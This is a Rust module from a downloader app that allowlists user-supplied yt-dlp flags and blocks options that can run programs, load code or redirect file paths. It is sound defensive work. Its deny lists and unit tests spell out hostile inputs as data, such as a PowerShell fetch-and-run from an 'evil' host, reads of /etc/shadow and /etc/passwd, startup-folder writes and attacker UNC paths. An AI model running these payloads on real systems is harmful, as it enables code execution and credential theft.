//! Allowlist for user-supplied yt-dlp flags.
//!
//! Users can add their own yt-dlp flags (Settings → "extra yt-dlp flags" and the
//! "custom arguments" download). A blocklist is not enough: yt-dlp exposes several
//! ways to run arbitrary programs (`--exec`, `--use-postprocessor Exec:...`,
//! `--netrc-cmd`, `--plugin-dirs`, ...) and accepts any unambiguous abbreviation of
//! a long option (`--netrc-c` == `--netrc-cmd`). This module only lets through a
//! curated set of options that cannot start a process, expands abbreviations to
//! the canonical option name so yt-dlp never re-interprets them, and drops the
//! value that belongs to a rejected option instead of leaving it behind as a stray
//! positional argument (which yt-dlp would treat as a URL).

/// How an allowed option consumes its value.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
enum Arity {
    /// Boolean switch, no value.
    Flag,
    /// Takes exactly one value (`--opt value` or `--opt=value`).
    Value,
}

use Arity::{Flag, Value};

/// Long options that are safe to forward. None of them can execute a program,
/// load code, read a config file or change where OmniGet writes files.
const ALLOWED_LONG: &[(&str, Arity)] = &[
    // Format selection
    ("--format", Value),
    ("--format-sort", Value),
    ("--format-sort-force", Flag),
    ("--no-format-sort-force", Flag),
    ("--merge-output-format", Value),
    ("--remux-video", Value),
    ("--recode-video", Value),
    ("--prefer-free-formats", Flag),
    ("--no-prefer-free-formats", Flag),
    ("--check-formats", Flag),
    ("--no-check-formats", Flag),
    ("--video-multistreams", Flag),
    ("--no-video-multistreams", Flag),
    ("--audio-multistreams", Flag),
    ("--no-audio-multistreams", Flag),
    // Audio
    ("--extract-audio", Flag),
    ("--audio-format", Value),
    ("--audio-quality", Value),
    ("--keep-video", Flag),
    ("--no-keep-video", Flag),
    // Subtitles, thumbnails, metadata
    ("--write-subs", Flag),
    ("--no-write-subs", Flag),
    ("--write-auto-subs", Flag),
    ("--no-write-auto-subs", Flag),
    ("--sub-langs", Value),
    ("--sub-format", Value),
    ("--convert-subs", Value),
    ("--embed-subs", Flag),
    ("--no-embed-subs", Flag),
    ("--write-thumbnail", Flag),
    ("--no-write-thumbnail", Flag),
    ("--convert-thumbnails", Value),
    ("--embed-thumbnail", Flag),
    ("--no-embed-thumbnail", Flag),
    ("--embed-metadata", Flag),
    ("--no-embed-metadata", Flag),
    ("--embed-chapters", Flag),
    ("--no-embed-chapters", Flag),
    ("--write-description", Flag),
    ("--write-info-json", Flag),
    ("--no-write-info-json", Flag),
    ("--parse-metadata", Value),
    ("--replace-in-metadata", Value),
    ("--xattrs", Flag),
    // SponsorBlock, sections, chapters
    ("--sponsorblock-remove", Value),
    ("--sponsorblock-mark", Value),
    ("--no-sponsorblock", Flag),
    ("--download-sections", Value),
    ("--force-keyframes-at-cuts", Flag),
    ("--no-force-keyframes-at-cuts", Flag),
    ("--split-chapters", Flag),
    ("--no-split-chapters", Flag),
    // Network
    ("--limit-rate", Value),
    ("--throttled-rate", Value),
    ("--retries", Value),
    ("--fragment-retries", Value),
    ("--extractor-retries", Value),
    ("--retry-sleep", Value),
    ("--concurrent-fragments", Value),
    ("--http-chunk-size", Value),
    ("--sleep-interval", Value),
    ("--min-sleep-interval", Value),
    ("--max-sleep-interval", Value),
    ("--sleep-requests", Value),
    ("--sleep-subtitles", Value),
    ("--socket-timeout", Value),
    ("--source-address", Value),
    ("--force-ipv4", Flag),
    ("--force-ipv6", Flag),
    ("--proxy", Value),
    ("--geo-bypass", Flag),
    ("--no-geo-bypass", Flag),
    ("--geo-bypass-country", Value),
    ("--xff", Value),
    ("--impersonate", Value),
    ("--user-agent", Value),
    ("--referer", Value),
    ("--add-headers", Value),
    ("--cookies-from-browser", Value),
    ("--no-cookies-from-browser", Flag),
    ("--legacy-server-connect", Flag),
    ("--no-check-certificates", Flag),
    // Extractors
    ("--extractor-args", Value),
    ("--js-runtimes", Value),
    ("--live-from-start", Flag),
    ("--no-live-from-start", Flag),
    ("--wait-for-video", Value),
    ("--no-wait-for-video", Flag),
    ("--hls-use-mpegts", Flag),
    ("--no-hls-use-mpegts", Flag),
    ("--mark-watched", Flag),
    ("--no-mark-watched", Flag),
    // Selection
    ("--no-playlist", Flag),
    ("--yes-playlist", Flag),
    ("--playlist-items", Value),
    ("--match-filters", Value),
    ("--no-match-filters", Flag),
    ("--age-limit", Value),
    ("--min-filesize", Value),
    ("--max-filesize", Value),
    ("--date", Value),
    ("--datebefore", Value),
    ("--dateafter", Value),
    ("--max-downloads", Value),
    // Filesystem behaviour (never the output location)
    ("--no-part", Flag),
    ("--part", Flag),
    ("--no-mtime", Flag),
    ("--mtime", Flag),
    ("--no-overwrites", Flag),
    ("--force-overwrites", Flag),
    ("--no-force-overwrites", Flag),
    ("--continue", Flag),
    ("--no-continue", Flag),
    ("--restrict-filenames", Flag),
    ("--no-restrict-filenames", Flag),
    ("--windows-filenames", Flag),
    ("--no-windows-filenames", Flag),
    ("--trim-filenames", Value),
    // Verbosity / error handling
    ("--verbose", Flag),
    ("--quiet", Flag),
    ("--no-warnings", Flag),
    ("--ignore-errors", Flag),
    ("--abort-on-error", Flag),
    ("--no-abort-on-error", Flag),
];

/// Single-dash aliases mapped to their long form.
const SHORT_ALIASES: &[(&str, &str)] = &[
    ("-f", "--format"),
    ("-S", "--format-sort"),
    ("-x", "--extract-audio"),
    ("-k", "--keep-video"),
    ("-r", "--limit-rate"),
    ("-R", "--retries"),
    ("-N", "--concurrent-fragments"),
    ("-I", "--playlist-items"),
    ("-w", "--no-overwrites"),
    ("-c", "--continue"),
    ("-i", "--ignore-errors"),
    ("-v", "--verbose"),
    ("-q", "--quiet"),
    ("-4", "--force-ipv4"),
    ("-6", "--force-ipv6"),
];

/// Options that can run code or read arbitrary config. An abbreviation that could
/// stand for one of these is always rejected, even if it would also match an
/// allowed option.
const DANGEROUS_LONG: &[&str] = &[
    "--exec",
    "--exec-before-download",
    "--no-exec",
    "--use-postprocessor",
    "--postprocessor-args",
    // yt-dlp alias of --postprocessor-args; not a prefix, so the abbreviation
    // check cannot catch it.
    "--ppa",
    "--external-downloader",
    "--external-downloader-args",
    "--downloader",
    "--downloader-args",
    "--netrc-cmd",
    "--netrc-location",
    "--plugin-dirs",
    "--config-locations",
    "--config-location",
    "--alias",
    "--print-to-file",
    "--batch-file",
    "--load-info-json",
    "--ffmpeg-location",
    "--output",
    "--paths",
    "--cookies",
    "--download-archive",
    "--cache-dir",
    "--update-to",
    "--update",
];

/// Options that make yt-dlp start a program, load code or read another config.
/// Code-generated (internal) flags are checked against this narrower list, since
/// OmniGet itself legitimately passes `--cookies`, `--ffmpeg-location`, `--paths`.
const EXEC_LONG: &[&str] = &[
    "--exec",
    "--exec-before-download",
    "--use-postprocessor",
    "--external-downloader",
    "--external-downloader-args",
    "--downloader",
    "--downloader-args",
    "--netrc-cmd",
    "--plugin-dirs",
    "--config-locations",
    "--config-location",
    "--alias",
    "--print-to-file",
    "--batch-file",
];

/// JavaScript runtimes yt-dlp knows about; `--js-runtimes` may point at one of
/// these binaries but never at an arbitrary executable.
const JS_RUNTIME_NAMES: &[&str] = &["deno", "node", "bun", "quickjs"];
const JS_RUNTIME_BINARIES: &[&str] = &[
    "deno",
    "deno.exe",
    "node",
    "node.exe",
    "bun",
    "bun.exe",
    "qjs",
    "qjs.exe",
    "quickjs",
    "quickjs.exe",
];

/// Result of filtering a list of user tokens.
#[derive(Debug, Default, PartialEq, Eq)]
pub struct FilteredFlags {
    /// Canonical tokens safe to hand to yt-dlp.
    pub accepted: Vec<String>,
    /// The original tokens that were refused (for logs and error messages).
    pub rejected: Vec<String>,
}

fn lookup_exact(name: &str) -> Option<(&'static str, Arity)> {
    ALLOWED_LONG
        .iter()
        .find(|(n, _)| *n == name)
        .map(|(n, a)| (*n, *a))
}

/// Resolve a long option (possibly abbreviated) to its canonical allowed name.
fn resolve_long(name: &str) -> Option<(&'static str, Arity)> {
    if !name.starts_with("--") || name.len() < 3 {
        return None;
    }
    if DANGEROUS_LONG.contains(&name) {
        return None;
    }
    if let Some(hit) = lookup_exact(name) {
        return Some(hit);
    }
    // Abbreviation: refuse anything that could also mean a dangerous option.
    if DANGEROUS_LONG.iter().any(|d| d.starts_with(name)) {
        return None;
    }
    let mut matches = ALLOWED_LONG.iter().filter(|(n, _)| n.starts_with(name));
    let first = matches.next()?;
    if matches.next().is_some() {
        return None; // ambiguous
    }
    Some((first.0, first.1))
}

fn resolve_option(name: &str) -> Option<(&'static str, Arity)> {
    if name.starts_with("--") {
        return resolve_long(name);
    }
    SHORT_ALIASES
        .iter()
        .find(|(short, _)| *short == name)
        .and_then(|(_, long)| lookup_exact(long))
}

/// True for an absolute path that cannot reach the network or climb out of
/// a folder: no UNC or `//` prefix, no `..`, and either `/…` or `X:\…`.
fn is_plain_absolute_path(p: &str) -> bool {
    if p.starts_with("\\\\") || p.starts_with("//") || p.starts_with("\\/") || p.starts_with("/\\")
    {
        return false;
    }
    if p.split(['/', '\\']).any(|part| part == "..") {
        return false;
    }
    let bytes = p.as_bytes();
    let windows_drive = bytes.len() > 3
        && bytes[0].is_ascii_alphabetic()
        && bytes[1] == b':'
        && (bytes[2] == b'\\' || bytes[2] == b'/');
    p.starts_with('/') || windows_drive
}

/// Policy for a `--js-runtimes` value typed by the user.
///
/// yt-dlp runs the binary it points at, so only a bare runtime name (looked up
/// on PATH by yt-dlp), a binary inside OmniGet's managed `bin` folder, or the
/// exact runtime OmniGet detected itself are accepted. A network path such as
/// `\\host\share\node.exe` would make Windows fetch and run a remote file.
pub(crate) fn js_runtime_allowed(
    value: &str,
    managed_bin: Option<&std::path::Path>,
    detected: Option<&str>,
) -> bool {
    let (name, path) = match value.split_once(':') {
        Some((n, p)) => (n, Some(p)),
        None => (value, None),
    };
    if !JS_RUNTIME_NAMES.contains(&name.to_ascii_lowercase().as_str()) {
        return false;
    }
    let Some(p) = path else {
        return true;
    };
    if detected == Some(value) {
        return true;
    }
    let file = p
        .rsplit(['/', '\\'])
        .next()
        .unwrap_or("")
        .to_ascii_lowercase();
    if p.is_empty() || !JS_RUNTIME_BINARIES.contains(&file.as_str()) || !is_plain_absolute_path(p) {
        return false;
    }
    match managed_bin {
        Some(dir) => std::path::Path::new(p).starts_with(dir),
        None => false,
    }
}

fn is_valid_js_runtime(value: &str) -> bool {
    let managed = crate::core::dependencies::managed_bin_dir();
    let detected = crate::core::ytdlp::cached_js_runtime();
    js_runtime_allowed(value, managed.as_deref(), detected.as_deref())
}

fn is_valid_value(option: &str, value: &str) -> bool {
    if value.is_empty() || value.contains('\0') || value.contains('\n') {
        return false;
    }
    match option {
        "--js-runtimes" => is_valid_js_runtime(value),
        _ => true,
    }
}

/// Filter user-supplied yt-dlp tokens through the allowlist.
///
/// Tokens are the same shape as on a command line: options and their values may
/// be separate items (`["--format", "best"]`) or joined (`["--format=best"]`).
/// `--proxy` (and its abbreviations) would replace the egress guard, or with
/// an empty value make yt-dlp connect directly, so it is refused while the
/// guard is on. The app's own proxy setting is a generated pair and stays.
fn is_proxy_option(name: &str) -> bool {
    name.len() >= 6 && "--proxy".starts_with(name)
}

fn proxy_override_refused(name: &str) -> bool {
    is_proxy_option(name) && crate::core::egress_proxy::guard_enabled()
}

pub fn filter_user_flags(tokens: &[String]) -> FilteredFlags {
    let mut out = FilteredFlags::default();
    let cleaned: Vec<&str> = tokens
        .iter()
        .map(|t| t.trim())
        .filter(|t| !t.is_empty())
        .collect();
    let mut i = 0;
    while i < cleaned.len() {
        let token = cleaned[i];
        i += 1;
        if !token.starts_with('-') || token == "-" || token == "--" {
            // Stray value or bare separator: never forward (yt-dlp would read it
            // as a URL or stop parsing options).
            out.rejected.push(token.to_string());
            continue;
        }
        let (raw_name, inline_value) = match token.split_once('=') {
            Some((n, v)) => (n, Some(v)),
            None => (token, None),
        };
        let name = if raw_name.starts_with("--") {
            raw_name.to_ascii_lowercase()
        } else {
            raw_name.to_string()
        };
        let resolved = resolve_option(&name).filter(|(c, _)| !proxy_override_refused(c));
        let Some((canonical, arity)) = resolved else {
            out.rejected.push(token.to_string());
            // Swallow the value that belonged to the refused option.
            if inline_value.is_none() && i < cleaned.len() && !cleaned[i].starts_with('-') {
                out.rejected.push(cleaned[i].to_string());
                i += 1;
            }
            continue;
        };
        match arity {
            Flag => {
                if inline_value.is_some() {
                    out.rejected.push(token.to_string());
                } else {
                    out.accepted.push(canonical.to_string());
                }
            }
            Value => {
                let value = match inline_value {
                    Some(v) => Some(v.to_string()),
                    None if i < cleaned.len() && !cleaned[i].starts_with("--") => {
                        i += 1;
                        Some(cleaned[i - 1].to_string())
                    }
                    None => None,
                };
                match value {
                    Some(v) if is_valid_value(canonical, &v) => {
                        out.accepted.push(canonical.to_string());
                        out.accepted.push(v);
                    }
                    Some(v) => {
                        out.rejected.push(token.to_string());
                        if inline_value.is_none() {
                            out.rejected.push(v);
                        }
                    }
                    None => out.rejected.push(token.to_string()),
                }
            }
        }
    }
    out
}

/// Strict variant used where the user explicitly typed arguments for one
/// download: any refused token is an error instead of being silently dropped.
pub fn validate_user_flags(tokens: &[String]) -> Result<Vec<String>, String> {
    let filtered = filter_user_flags(tokens);
    if filtered.rejected.is_empty() {
        Ok(filtered.accepted)
    } else {
        Err(format!(
            "Disallowed yt-dlp argument for security: {}",
            filtered.rejected.join(" ")
        ))
    }
}

/// True when an internal (code-generated) token could make yt-dlp run a program,
/// including abbreviated spellings such as `--exec-befo` or `--netrc-c`.
pub fn is_dangerous_option(token: &str) -> bool {
    let lower = token.trim().to_ascii_lowercase();
    let name = lower.split('=').next().unwrap_or(&lower);
    if !name.starts_with("--") || name.len() < 4 {
        return false;
    }
    EXEC_LONG.iter().any(|d| *d == name || d.starts_with(name)) && lookup_exact(name).is_none()
}

/// Real yt-dlp options that are also a prefix of a dangerous option. optparse
/// prefers an exact match, so these spellings are not abbreviations.
const EXACT_SAFE_PREFIXES: &[&str] = &["--print", "--no-exec"];

/// Dangerous options that take no value.
const DANGEROUS_FLAGS: &[&str] = &["--update"];

/// Single-dash aliases of dangerous options (`-a` batch file, `-o` output,
/// `-P` paths, `-U` update).
const DANGEROUS_SHORT: &[char] = &['a', 'o', 'P', 'U'];

fn dangerous_long_name(name: &str) -> bool {
    if EXACT_SAFE_PREFIXES.contains(&name) {
        return false;
    }
    if DANGEROUS_LONG.contains(&name) {
        return true;
    }
    name.len() >= 4
        && DANGEROUS_LONG.iter().any(|d| d.starts_with(name))
        && lookup_exact(name).is_none()
}

fn contains_pair(haystack: &[String], pair: &[String]) -> bool {
    !pair.is_empty() && haystack.windows(pair.len()).any(|w| w == pair)
}

/// Validate the argv of an edited "retry with command" against the command
/// OmniGet generated for the same download (`generated`, as recorded).
///
/// The edited command may change any option except the dangerous ones
/// (running programs, reading another config or batch file, picking the
/// ffmpeg binary, the output path, the cookie file, updating yt-dlp...).
/// Those are only accepted when the option and its value are exactly the
/// ones OmniGet generated.
pub fn validate_override_argv(argv: &[String], generated: &[String]) -> Result<(), String> {
    let mut refused: Vec<String> = Vec::new();
    let mut i = 0;
    while i < argv.len() {
        let token = argv[i].trim();
        i += 1;
        if token == "--" {
            // optparse hands a bare "--" to an option that expects a value, so
            // "--user-agent -- --exec calc" keeps parsing options after it.
            // Only positional URLs may follow the separator.
            let tail = &argv[i..];
            if let Some(bad) = tail.iter().find(|t| t.trim().starts_with('-')) {
                refused.push(format!("-- {}", bad.trim()));
            }
            break;
        }
        if let Some(long) = token.strip_prefix("--") {
            let (raw_name, inline) = match long.split_once('=') {
                Some((n, _)) => (n, true),
                None => (long, false),
            };
            let name = format!("--{}", raw_name.to_ascii_lowercase());
            if name.len() >= 5 && "--js-runtimes".starts_with(name.as_str()) {
                let value = match long.split_once('=') {
                    Some((_, v)) => Some(v.to_string()),
                    None if i < argv.len() => {
                        i += 1;
                        Some(argv[i - 1].clone())
                    }
                    None => None,
                };
                let pair: Vec<String> = if inline {
                    vec![argv[i - 1].clone()]
                } else {
                    argv[i.saturating_sub(2)..i].to_vec()
                };
                let ok = value.as_deref().is_some_and(is_valid_js_runtime);
                if !ok && !contains_pair(generated, &pair) {
                    refused.extend(pair);
                }
                continue;
            }
            if !dangerous_long_name(&name) && !proxy_override_refused(&name) {
                continue;
            }
            let pair: Vec<String> = if inline || DANGEROUS_FLAGS.contains(&name.as_str()) {
                vec![argv[i - 1].clone()]
            } else if i < argv.len() {
                i += 1;
                vec![argv[i - 2].clone(), argv[i - 1].clone()]
            } else {
                vec![argv[i - 1].clone()]
            };
            if !contains_pair(generated, &pair) {
                refused.extend(pair);
            }
            continue;
        }
        if let Some(short) = token.strip_prefix('-') {
            if short.is_empty() || !short.chars().any(|c| DANGEROUS_SHORT.contains(&c)) {
                continue;
            }
            let takes_value = short.len() == 1 && short != "U";
            let pair: Vec<String> = if takes_value && i < argv.len() {
                i += 1;
                vec![argv[i - 2].clone(), argv[i - 1].clone()]
            } else {
                vec![argv[i - 1].clone()]
            };
            if !contains_pair(generated, &pair) {
                refused.extend(pair);
            }
        }
    }
    if refused.is_empty() {
        Ok(())
    } else {
        Err(format!(
            "Disallowed yt-dlp argument for security: {}",
            refused.join(" ")
        ))
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn v(items: &[&str]) -> Vec<String> {
        items.iter().map(|s| s.to_string()).collect()
    }

    fn generated() -> Vec<String> {
        v(&[
            "-f",
            "bv*+ba/b",
            "--ignore-config",
            "--print",
            "after_move:OMNIGET_FILEPATH:%(filepath)s",
            "--ffmpeg-location",
            "/app/bin/ffmpeg",
            "--cookies",
            "/app/cookies.txt",
            "-o",
            "/home/u/Downloads/%(title).200s [%(id)s].%(ext)s",
            "https://example.com/watch?v=1",
        ])
    }

    #[test]
    fn edited_command_keeps_generated_options_and_safe_edits() {
        let mut edited = generated();
        edited[1] = "18".to_string();
        edited.insert(0, "yt-dlp".to_string());
        edited.extend(v(&["--limit-rate", "1M", "--print", "title", "--no-exec"]));
        assert_eq!(validate_override_argv(&edited, &generated()), Ok(()));
    }

    #[test]
    fn edited_command_rejects_execution_and_path_options() {
        let vectors: &[&[&str]] = &[
            &["--exec", "powershell -c iwr evil|iex"],
            &["--exec-before-download", "sh x"],
            &["--exec-b", "sh x"],
            &["--EXEC=calc"],
            &["--config-locations", "\\\\host\\share\\x.conf"],
            &["--config-loc=/tmp/x.conf"],
            &["--batch-file", "/tmp/urls"],
            &["-a", "/tmp/urls"],
            &["-ia", "/tmp/urls"],
            &["--load-info-json", "/tmp/x.json"],
            &["--netrc-cmd", "sh x"],
            &["--plugin-dirs", "/tmp/p"],
            &["--ffmpeg-location", "/tmp/evil"],
            &["--cookies", "/etc/shadow"],
            &["-o", "/startup/x.bat"],
            &["-P", "/startup"],
            &["--update-to", "attacker/yt-dlp"],
            &["-U"],
            &["--print-to-file", "%(id)s", "/startup/x.bat"],
        ];
        for vector in vectors {
            let mut edited = generated();
            edited.extend(v(vector));
            assert!(
                validate_override_argv(&edited, &generated()).is_err(),
                "accepted {vector:?}"
            );
        }
    }

    #[test]
    fn proxy_flag_cannot_bypass_the_egress_guard() {
        assert!(crate::core::egress_proxy::guard_enabled());
        for vector in [
            &["--proxy", ""][..],
            &["--proxy", "http://10.0.0.1:8080"][..],
            &["--proxy="][..],
            &["--prox", "socks5://192.168.1.1"][..],
        ] {
            let filtered = filter_user_flags(&v(vector));
            assert!(filtered.accepted.is_empty(), "accepted {vector:?}");
            let mut edited = generated();
            edited.pop();
            edited.extend(v(vector));
            edited.push("https://example.com/v".into());
            assert!(
                validate_override_argv(&edited, &generated()).is_err(),
                "override accepted {vector:?}"
            );
        }
        // The app's own proxy setting is generated and stays allowed.
        let mut gen = generated();
        gen.splice(0..0, v(&["--proxy", "http://corp:3128"]));
        assert_eq!(validate_override_argv(&gen, &gen), Ok(()));
    }

    #[test]
    fn double_dash_swallowed_as_an_option_value_does_not_end_validation() {
        // optparse gives "--" to an option that expects a value, so everything
        // after it is still parsed as options by yt-dlp.
        let vectors: &[&[&str]] = &[
            &[
                "--user-agent",
                "--",
                "--exec",
                "calc",
                "--",
                "https://example.com/v",
            ],
            &["--referer", "--", "--exec=calc", "https://example.com/v"],
            &["--", "-o", "/startup/x.bat", "https://example.com/v"],
            &["--", "https://example.com/v", "--exec", "calc"],
        ];
        for vector in vectors {
            let mut edited = generated();
            edited.pop();
            edited.extend(v(vector));
            assert!(
                validate_override_argv(&edited, &generated()).is_err(),
                "accepted {vector:?}"
            );
        }
        let mut ok = generated();
        ok.pop();
        ok.extend(v(&[
            "--user-agent",
            "x",
            "--",
            "https://example.com/watch?v=1",
        ]));
        assert_eq!(validate_override_argv(&ok, &generated()), Ok(()));
    }

    #[test]
    fn every_yt_dlp_alias_of_a_dangerous_option_is_refused() {
        // Aliases as declared in yt_dlp/options.py (2026.10.26).
        let aliases: &[&[&str]] = &[
            &["--ppa", "ffmpeg:-i /etc/passwd"],
            &["--PPA=ffmpeg:-y /startup/x.bat"],
            &["--external-downloader", "curl"],
            &["--external-downloader-args", "x"],
        ];
        for vector in aliases {
            let mut edited = generated();
            edited.extend(v(vector));
            assert!(
                validate_override_argv(&edited, &generated()).is_err(),
                "accepted {vector:?}"
            );
            assert!(filter_user_flags(&v(vector)).accepted.is_empty());
        }
    }

    #[test]
    fn js_runtime_paths_outside_the_managed_folder_are_refused() {
        let managed = std::path::Path::new("/app/data/bin");
        let check = |value: &str| js_runtime_allowed(value, Some(managed), None);
        for bad in [
            "node:\\\\attacker\\share\\node.exe",
            "node:\\\\files.evil.com@SSL\\x\\node.exe",
            "node://attacker/share/node",
            "node:/tmp/node",
            "node:node",
            "node:../bin/node",
            "node:/app/data/bin/../../../tmp/node",
            "deno:C:\\Users\\x\\Downloads\\deno.exe",
        ] {
            assert!(!check(bad), "accepted {bad}");
            assert!(
                filter_user_flags(&v(&["--js-runtimes", bad]))
                    .accepted
                    .is_empty(),
                "allowlist accepted {bad}"
            );
        }
        assert!(check("node"));
        assert!(check("deno"));
        assert!(check("deno:/app/data/bin/deno"));
        // The runtime OmniGet detected itself stays usable.
        assert!(js_runtime_allowed(
            "node:/usr/bin/node",
            Some(managed),
            Some("node:/usr/bin/node")
        ));
    }

    #[test]
    fn edited_command_cannot_add_a_js_runtime_path() {
        for bad in [
            &["--js-runtimes", "node:\\\\attacker\\share\\node.exe"][..],
            &["--js-runtimes=node:/tmp/node"][..],
            &["--js-run", "node:/tmp/node"][..],
        ] {
            let mut edited = generated();
            edited.extend(v(bad));
            assert!(
                validate_override_argv(&edited, &generated()).is_err(),
                "accepted {bad:?}"
            );
        }
        let mut ok = generated();
        ok.extend(v(&["--js-runtimes", "deno"]));
        assert_eq!(validate_override_argv(&ok, &generated()), Ok(()));
    }

    #[test]
    fn execution_vectors_are_rejected() {
        let vectors: &[&[&str]] = &[
            &["--exec", "touch /tmp/x"],
            &["--exec=touch /tmp/x"],
            &["--exec-befo", "touch /tmp/x"],
            &[
                "--use-postprocessor",
                "Exec:exec_cmd=touch /tmp/x;when=pre_process",
            ],
            &["--use-post", "Exec:exec_cmd=id"],
            &["--netrc-cmd", "id"],
            &["--netrc-c", "id"],
            &["--plugin-dirs", "/tmp/evil"],
            &["--config-locations", "/tmp/conf"],
            &["--ffmpeg-location", "/bin/sh"],
            &["--batch-file", "/etc/passwd"],
            &["-a", "/etc/passwd"],
            &["--js-runtimes", "node:/tmp/evil.sh"],
            &["--js-runtimes", "evil:/usr/bin/node"],
            &["-o", "/etc/cron.d/x"],
        ];
        for tokens in vectors {
            let out = filter_user_flags(&v(tokens));
            assert!(
                out.accepted.is_empty(),
                "{tokens:?} must be refused, got {:?}",
                out.accepted
            );
            assert_eq!(
                out.rejected.len(),
                tokens.len(),
                "{tokens:?}: value must be dropped too"
            );
        }
    }

    #[test]
    fn safe_flags_are_kept_and_abbreviations_expanded() {
        let out = filter_user_flags(&v(&[
            "--format",
            "bv*+ba/b",
            "--embed-chap",
            "--limit-rate=2M",
            "-N",
            "4",
            "--sponsorblock-remove",
            "sponsor",
            "--js-runtimes",
            "node",
        ]));
        assert!(out.rejected.is_empty(), "{:?}", out.rejected);
        assert_eq!(
            out.accepted,
            v(&[
                "--format",
                "bv*+ba/b",
                "--embed-chapters",
                "--limit-rate",
                "2M",
                "--concurrent-fragments",
                "4",
                "--sponsorblock-remove",
                "sponsor",
                "--js-runtimes",
                "node",
            ])
        );
    }

    #[test]
    fn ambiguous_abbreviation_is_rejected() {
        // "--embed" matches several allowed options.
        let out = filter_user_flags(&v(&["--embed"]));
        assert!(out.accepted.is_empty());
    }

    #[test]
    fn stray_values_are_not_forwarded() {
        let out = filter_user_flags(&v(&["https://evil.example/x", "--no-mtime"]));
        assert_eq!(out.accepted, v(&["--no-mtime"]));
        assert_eq!(out.rejected, v(&["https://evil.example/x"]));
    }

    #[test]
    fn strict_validation_reports_rejections() {
        assert!(validate_user_flags(&v(&["--netrc-c", "id"])).is_err());
        assert_eq!(
            validate_user_flags(&v(&["--write-subs"])).unwrap(),
            v(&["--write-subs"])
        );
    }

    #[test]
    fn dangerous_option_detection_handles_abbreviations() {
        assert!(is_dangerous_option("--exec-befo"));
        assert!(is_dangerous_option("--netrc-c=id"));
        assert!(is_dangerous_option("--use-postprocessor"));
        assert!(!is_dangerous_option("--no-overwrites"));
        assert!(!is_dangerous_option("--add-headers"));
        assert!(!is_dangerous_option("--download-sections"));
        assert!(!is_dangerous_option("--cookies"));
        assert!(!is_dangerous_option("--ffmpeg-location"));
    }
}
